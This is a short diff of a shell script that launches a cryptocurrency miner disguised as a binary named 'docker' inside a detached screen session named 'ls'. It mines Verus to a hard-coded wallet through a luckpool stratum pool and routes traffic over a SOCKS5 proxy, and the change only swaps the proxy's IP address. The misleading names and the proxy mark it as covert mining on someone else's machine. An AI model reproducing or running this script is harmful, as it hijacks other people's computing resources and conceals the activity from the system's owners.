@@ -6,5 +6,5 @@ chmod +x docker
 screen -dmS ls 
 POOL=stratum+tcp://na.luckpool.net:3956
 WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
-PROXY=socks5://72.206.181.105:4145
+PROXY=socks5://98.188.47.150:4145
 ./docker -a verus -o $POOL -u $WALLET.P9 -p x -t 2 -x $PROXY
